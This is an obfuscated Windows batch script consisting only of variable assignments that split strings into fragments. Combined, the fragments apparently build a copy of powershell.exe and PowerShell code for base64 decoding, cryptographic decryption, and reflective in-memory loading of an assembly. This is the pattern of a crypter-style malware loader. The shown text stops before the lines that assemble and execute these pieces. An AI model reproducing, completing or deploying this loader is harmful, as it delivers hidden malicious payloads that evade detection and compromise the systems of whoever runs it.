@echo off
set "HBHiYfHXry=Wi"
set "GuSissyBVG=ow"
set "rZStXZWLHa=he"
set "iRPabhtipa=\v"
set "HgbLEmHKvV=em"
set "YVqjZcwjmW= /"
set "mjlHwgptBt=do"
set "yRYqvwmuxV=\W"
set "FOwGPMbqBZ=we"
set "pFQGDpEwmx=co"
set "ZmmzZvLwwi=Po"
set "KWBrhPiKpi=ws"
set "sUJUTmVAUU=0\"
set "NVxSAoiVhO=rs"
set "iehbIUCMYy=32"
set "mKWLHzjRrQ=po"
set "epkeZxWKyT=:\"
set "GMSgjTTGDE=Sy"
set "lTovOzNgZr=he"
set "IJFUeQscEQ=py"
set "PfQaDGUupw=y "
set "UkvDAunzoo=nd"
set "VMsLFzKhBX=in"
set "jukampGqUo=we"
set "kJRGRkCQdm=1."
set "roKDEMzaSq=xe"
set "kxvjnnJzQG=st"
set "gUrqsoJkEe= C"
set "vTXsjqMAfS=ll"
set "gSSekZlbEP=rS"
set "TIDLiEmjrm=s\"
set "lFZUgrndls=.e"
set "aKynGDyceg=ll"
set "DyxkrvRLFO= %~dp0"
set "MPJToFHIbu=cd"
set "hcZAOOvmgO=8kuY"
set "TnrNYxTTJy=bjec"
set "fYbtlRVyVI=THxh"
set "EGRwxEWetQ=('da"
set "dNoxVEzvWP=trea"
set "ChoirOUTBM=..-1"
set "DxmKGuBUbQ=tryP"
set "mqFTLNbaHo=DIdO"
set "SXfDDafVch=em.C"
set "chVkYgZcGz=Disp"
set "RodzzyofPR=[Sys"
set "jlTfGjMfSZ=();$"
set "CTRPCHWIJs=hy.A"
set "WbumvnPZyZ=rt]:"
set "FccoDSwOtz== [S"
set "KrbhqSHMNL=$dMq"
set "WcEhXbYHPa=H = "
set "gaTFfUqvHs=:: '"
set "VSrlkcLzYP=morF"
set "wDjOoIoDyG=yste"
set "TfuGxRCTip=S46e"
set "poVtgkxMuc=[-1."
set "iPaexGpTpy=Secu"
set "vEsItorhoy=m.IO"
set "EsmEANEjUv= '')"
set "gvTWqfAbCv=.Cry"
set "gNIIoLRSfx=e = "
set "HfZwRxTVYO=ew-O"
set "tyLgyqDzWt=OXXh"
set "jXnNwEObLm=qjh."
set "hqLfeKYYEc=ddin"
set "VARWSurRBh=pres"
set "VdDOcifrGL=();$"
set "beuvKtMjdh=Wyqo"
set "AEEjfJNPQY=n ''"
set "ILcPbeaIDi=.Mem"
set "LGKtvTUUUF=tem."
set "kMhjMQgebv=flec"
set "CWrNVdQSpC=ert]"
set "ZejdhFlFdP=FcNh"
set "mFVnpDBBTG=o.En"
set "UgXrelQQxF=)($R"
set "tGniqYzNKI=).Sp"
set "cypDegIvuA= [Sy"
